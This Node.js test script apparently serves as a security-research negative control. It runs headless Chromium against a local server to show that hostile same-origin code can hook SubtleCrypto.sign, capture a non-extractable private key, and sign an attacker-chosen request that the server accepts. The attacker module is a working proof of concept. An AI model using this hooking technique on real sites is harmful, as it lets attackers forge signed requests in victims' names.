'use strict';

const assert=require('node:assert/strict');
const http=require('node:http');
const {execFile}=require('node:child_process');
const {promisify}=require('node:util');
const {createPublicKey,verify}=require('node:crypto');

/** @param {http.IncomingMessage} request @returns {Promise<string>} */
async function readBody(request){
  /** @type {Buffer[]} */
  const parts=[];
  for await(const part of request)parts.push(Buffer.from(part));
  return Buffer.concat(parts).toString('utf8');
}

/**
 * Real Chromium negative control for a software-only proof-of-possession
 * upgrade. An honest app creates an ECDSA private CryptoKey with
 * extractable=false and keeps it in module-local state. Hostile same-origin
 * code hooks SubtleCrypto.sign before the app runs, captures the opaque
 * CryptoKey object on the first legitimate signature, confirms exportKey is
 * refused, then uses that same key object to sign a fresh attacker-chosen
 * request accepted by the server.
 *
 * @returns {Promise<void>}
 */
async function main(){
  /** @type {Record<string,unknown>|null} */
  let publicJwk=null;
  let verifiedRequests=0;
  const usedPayloads=new Set();

  const app=[
    'const encoder=new TextEncoder();',
    'export async function honest(){',
    '  const pair=await crypto.subtle.generateKey({name:"ECDSA",namedCurve:"P-256"},false,["sign","verify"]);',
    '  if(pair.privateKey.extractable!==false)throw new Error("private key unexpectedly extractable");',
    '  const publicJwk=await crypto.subtle.exportKey("jwk",pair.publicKey);',
    '  let response=await fetch("/register",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify(publicJwk)});',
    '  if(!response.ok)throw new Error("registration failed");',
    '  const payload=JSON.stringify({kind:"honest",nonce:1,value:47});',
    '  const signature=await crypto.subtle.sign({name:"ECDSA",hash:"SHA-256"},pair.privateKey,encoder.encode(payload));',
    '  response=await fetch("/protected",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({payload,signature:btoa(String.fromCharCode(...new Uint8Array(signature)))})});',
    '  return response.status;',
    '}'
  ].join('\n');

  const attacker=[
    'const output=document.getElementById("out");',
    'const encoder=new TextEncoder();',
    'const originalSign=crypto.subtle.sign.bind(crypto.subtle);',
    'let capturedKey=null;',
    'crypto.subtle.sign=async function(algorithm,key,data){',
    '  if(key&&key.type==="private")capturedKey=key;',
    '  return originalSign(algorithm,key,data);',
    '};',
    'try{',
    '  const {honest}=await import("/app.mjs");',
    '  const honestStatus=await honest();',
    '  if(!capturedKey)throw new Error("sign hook did not capture private CryptoKey");',
    '  let exportResult="unexpected-success";',
    '  try{await crypto.subtle.exportKey("jwk",capturedKey);}catch(error){exportResult=error.name;}',
    '  const payload=JSON.stringify({kind:"attacker-relay",nonce:2,value:91});',
    '  const signature=await originalSign({name:"ECDSA",hash:"SHA-256"},capturedKey,encoder.encode(payload));',
    '  const relay=await fetch("/protected",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({payload,signature:btoa(String.fromCharCode(...new Uint8Array(signature)))})});',
    '  output.textContent="HONEST="+honestStatus+"|RELAY="+relay.status+"|EXPORT="+exportResult+"|CAPTURED="+Boolean(capturedKey);',
    '}catch(error){output.textContent="FAIL:"+String(error);}'
  ].join('\n');

  const html='<!doctype html><html><body><pre id="out">pending</pre>'+
    '<script type="module" src="/attacker.mjs"></script></body></html>';

  const server=http.createServer(async(request,response)=>{
    try{
      if(request.url==='/'){
        response.writeHead(200,{
          'content-type':'text/html; charset=utf-8',
          'content-security-policy':"default-src 'none'; script-src 'self'; connect-src 'self'",
          'cache-control':'no-store'
        });
        response.end(html);return;
      }
      if(request.url==='/app.mjs'||request.url==='/attacker.mjs'){
        response.writeHead(200,{'content-type':'text/javascript; charset=utf-8','cache-control':'no-store'});
        response.end(request.url==='/app.mjs'?app:attacker);return;
      }
      if(request.url==='/register'&&request.method==='POST'){
        publicJwk=JSON.parse(await readBody(request));
        response.writeHead(204).end();return;
      }
      if(request.url==='/protected'&&request.method==='POST'){
        if(!publicJwk){response.writeHead(403).end();return;}
        const body=/** @type {{payload?:unknown,signature?:unknown}} */(
          JSON.parse(await readBody(request))
        );
        if(typeof body.payload!=='string'||typeof body.signature!=='string'||
          usedPayloads.has(body.payload)){
          response.writeHead(403).end();return;
        }
        const key=createPublicKey({
          key:/** @type {any} */(publicJwk),
          format:'jwk'
        });
        const valid=verify('sha256',Buffer.from(body.payload),{
          key,dsaEncoding:'ieee-p1363'
        },Buffer.from(body.signature,'base64'));
        if(!valid){response.writeHead(403).end();return;}
        usedPayloads.add(body.payload);
        verifiedRequests++;
        response.writeHead(200,{'content-type':'application/json'}).end('{"ok":true}');
        return;
      }
      response.writeHead(404).end();
    }catch(error){
      response.writeHead(500,{'content-type':'text/plain'}).end(String(error));
    }
  });

  /** @type {Promise<void>} */
  const ready=new Promise((resolve,reject)=>{
    server.once('error',reject);
    server.listen(0,'127.0.0.1',()=>resolve());
  });
  await ready;
  try{
    const address=server.address();
    assert.ok(address&&typeof address==='object');
    const origin='http://127.0.0.1:'+address.port;
    const {stdout}=await promisify(execFile)(process.env.CHROMIUM_BIN??'chromium',[
      '--headless','--no-sandbox','--disable-gpu','--disable-dev-shm-usage',
      '--no-first-run','--virtual-time-budget=6000','--dump-dom',origin+'/'
    ],{timeout:45000,maxBuffer:4*1024*1024,encoding:'utf8'});
    const observed=stdout.match(/<pre id="out">([^<]+)<\/pre>/u)?.[1];
    assert.equal(observed,'HONEST=200|RELAY=200|EXPORT=InvalidAccessError|CAPTURED=true',
      'Unexpected hostile WebCrypto proof-of-possession result: '+stdout.slice(-1800));
    assert.equal(verifiedRequests,2);
    assert.equal(usedPayloads.size,2);
    console.log('SCO_WEBCRYPTO_POP_ATTACK '+JSON.stringify({
      node:process.version,
      platform:process.platform,
      privateKeyExtractable:false,
      privateExportRejected:'InvalidAccessError',
      legitimateSignedRequestAccepted:true,
      freshAttackerChosenSignedRequestAccepted:true,
      verifiedRequests,
      implication:'A non-extractable software CryptoKey remains usable by hostile same-origin runtime code that intercepts its signing operation.'
    }));
  }finally{
    /** @type {Promise<void>} */
    const closed=new Promise((resolve,reject)=>
      server.close(error=>error?reject(error):resolve()));
    await closed;
  }
}

if(require.main===module){
  main().catch(error=>{console.error(error);process.exitCode=1;});
}

module.exports={main};
